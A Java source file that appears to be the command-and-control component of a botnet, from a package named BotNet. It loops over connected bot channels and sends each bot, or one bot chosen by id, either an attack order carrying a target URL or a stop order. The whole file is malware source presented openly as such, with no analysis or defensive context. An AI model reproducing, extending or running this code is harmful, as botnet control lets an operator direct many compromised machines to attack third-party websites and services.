package com.edsolab.BotNet.Server;

import java.util.List;

import com.edsolab.BotNet.TLV.Data;
import com.edsolab.BotNet.model.ClientChannel;

import io.netty.channel.Channel;

public class ControlClient implements Runnable {

	public ControlClient() {
		System.out.println("Control client is readdy!!");
	}

	@Override
	public void run() {
		while (true) {
			if (KeyServer.attackAll) {
				for (Channel channel : ProcessingHandler.channels) {
					Data data = new Data("addr", "DATA".getBytes(), KeyServer.url.getBytes());
					channel.writeAndFlush(data);
				}
				KeyServer.attackAll = false;
			}
			
			if(KeyServer.sleepAll) {
				for (Channel channel : ProcessingHandler.channels) {
					Data data = new Data("stop", "STOP".getBytes(), KeyServer.url.getBytes());
					channel.writeAndFlush(data);
				}
				KeyServer.sleepAll = false;
			}

			if (KeyServer.attackById) {
				for (Channel channel : ProcessingHandler.channels) {
					if(KeyServer.id.equals(channel.id().toString())) {
						Data data = new Data("addr", "DATA".getBytes(), KeyServer.url.getBytes());
						channel.writeAndFlush(data);
					}
				}
				KeyServer.attackById = false;
			}
			
			if (KeyServer.sleepById) {
				for (Channel channel : ProcessingHandler.channels) {
					if(KeyServer.id.equals(channel.id().toString())) {
						Data data = new Data("stop", "STOP".getBytes(), KeyServer.url.getBytes());
						channel.writeAndFlush(data);
					}
				}
				KeyServer.sleepById = false;
			}
			try {
				Thread.sleep(1);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
	}

}
